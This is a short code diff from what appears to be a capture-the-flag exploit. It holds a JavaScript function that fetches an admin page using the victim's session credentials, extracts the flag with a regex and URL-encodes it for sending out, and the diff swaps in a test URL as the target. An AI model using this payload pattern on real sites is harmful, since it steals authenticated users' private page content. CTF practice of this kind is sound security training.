@@ -29,7 +29,7 @@ function getData(url) {
 async function getRealData() {
   const AdminUrl = "http://127.0.0.1:1337/admin";
   const testurl = "https://m1ra1b0t.github.io/";
-  const response =  await fetch(AdminUrl, {credentials: 'include',});
+  const response =  await fetch(testurl, {credentials: 'include',});
   const adminHtml = await response.text();
   const flag = adminHtml.match('<h4>.*<\/h4>');
   const adminHtmlEncoded = encodeURIComponent(flag);
